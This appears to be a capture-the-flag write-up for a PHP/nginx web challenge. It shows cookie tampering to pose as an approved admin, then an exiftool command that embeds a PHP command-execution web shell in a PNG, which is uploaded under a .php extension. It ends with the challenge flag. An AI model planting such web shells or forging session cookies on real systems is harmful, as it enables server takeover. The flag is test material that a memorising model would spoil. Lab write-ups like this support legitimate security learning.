**RCE via image file upload**

No download of source this time - it is nginx with PHP

![image](https://user-images.githubusercontent.com/87831546/144930279-55abf556-7f2d-47f4-b241-24e1ab821edb.png)

If we create an account it says we don't have permissions to edit our profile

![image](https://user-images.githubusercontent.com/87831546/144930297-fa800b42-f342-44f6-b8a1-d14892d63c1c.png)

Create an account called admin, then base64 decode cookie and change to
```
{"username":"admin","approved":true}
```

Now can upload files - says we can only upload png, it checks the content of the file and to make sure it is a png image, but doesn't care about the file extension.

![image](https://user-images.githubusercontent.com/87831546/144930343-d524eac4-bbef-4187-b75b-fd6e719f8f17.png)

We know the server runs php, so we can get code execution via embedding php code in the png

![image](https://user-images.githubusercontent.com/87831546/144930408-646514f2-e27e-4082-8209-ec8ed9e9fc57.png)

https://thecyberjedi.com/php-shell-in-a-jpeg-aka-froghopper/

```
exiftool -DocumentName="<h1>Testing
<?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" cabin.png
```

![image](https://user-images.githubusercontent.com/87831546/144930442-fd12dbd9-7fb1-4b5f-a0fd-3b3fa97697be.png)

Then rename cabin.png to cabin.php (as the server doesn't care about extensions) or could do cabin.php.png - https://sushant747.gitbooks.io/total-oscp-guide/content/bypass_image_upload.html  

Then go to the image and see where it is uploaded with inspect element
![image](https://user-images.githubusercontent.com/87831546/144930477-4228e9b2-05a4-4443-9b46-bce1cd5b2025.png)

And we have code execution!
![image](https://user-images.githubusercontent.com/87831546/144930496-4f3ffccf-240f-4ad5-846e-f8f62214ba7f.png)

```
HTB{br4k3_au7hs_g3t_5h3lls}
```
